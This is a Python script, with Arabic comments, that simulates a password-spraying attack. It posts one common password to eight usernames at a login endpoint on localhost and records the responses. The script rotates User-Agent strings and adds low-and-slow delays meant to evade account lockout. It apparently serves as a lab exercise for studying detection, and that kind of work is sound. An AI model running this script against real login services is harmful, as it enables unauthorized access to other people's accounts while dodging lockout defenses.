import requests
import time
import random
import json
from datetime import datetime

SERVER_URL = "http://127.0.0.1:5000/login"

# قائمة المستخدمين (رش كلمة مرور واحدة على عدة حسابات)
USERS = [
    "admin",
    "john.doe",
    "jane.smith",
    "mike.brown",
    "sara.jones",
    "alex.wang",
    "lisa.chen",
    "tom.harris"
]

# كلمة المرور الشائعة المستخدمة في Password Spraying
SPRAY_PASSWORD = "Password123!"

# User-Agents مختلفة لمحاكاة سلوك واقعي
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.81.0",
    "python-requests/2.31.0"
]

# تأخير منخفض لتجنّب القفل (Low-and-Slow)
DELAY_RANGE = (3, 6)

results = []

print("=" * 60)
print(" Password Spraying Client Simulation Started")
print(f" Target Password: {SPRAY_PASSWORD}")
print("=" * 60)

for idx, username in enumerate(USERS, start=1):
    delay = random.uniform(*DELAY_RANGE)
    time.sleep(delay)

    headers = {
        "User-Agent": random.choice(USER_AGENTS)
    }

    payload = {
        "username": username,
        "password": SPRAY_PASSWORD
    }

    try:
        response = requests.post(
            SERVER_URL,
            json=payload,
            headers=headers,
            timeout=5
        )

        status = response.status_code
        message = response.json().get("message", response.text)

        print(f"[{idx}] User: {username:<12} | Status: {status}")

        results.append({
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "status_code": status,
            "message": message,
            "delay_seconds": round(delay, 2)
        })

    except Exception as e:
        print(f"[{idx}] User: {username:<12} | ERROR: {str(e)}")
        results.append({
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "error": str(e)
        })

# حفظ نتائج الهجوم للتحليل
with open("attack_results.json", "w", encoding="utf-8") as f:
    json.dump(results, f, indent=2, ensure_ascii=False)

print("\n" + "=" * 60)
print(" Simulation finished")
print(" Results saved to attack_results.json")
print("=" * 60)
